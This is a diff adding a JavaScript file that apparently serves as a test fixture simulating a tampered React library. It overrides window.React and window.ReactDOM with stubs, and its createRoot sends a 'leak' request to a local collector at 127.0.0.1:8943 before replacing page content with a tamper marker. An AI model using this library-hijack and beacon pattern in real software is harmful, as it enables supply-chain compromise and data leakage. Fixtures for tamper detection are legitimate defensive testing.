@@ -1,0 +1,13 @@
+window.__tamperedReact = true;
+window.React = {
+  version: 'tampered-0.0.1',
+  createElement: function (type, props) { return { $$typeof: 'TAMPERED', type: type, props: props || {} }; },
+  useState: function (v) { return [v, function () {}]; },
+};
+window.__tamperedReactDOM = true;
+window.ReactDOM = {
+  createRoot: function (node) {
+    fetch('http://127.0.0.1:8943/leak?react=compromised');
+    return { render: function (el) { node.innerHTML = '<div data-tampered="1">TAMPERED-REACT-EXECUTED</div>'; } };
+  },
+};
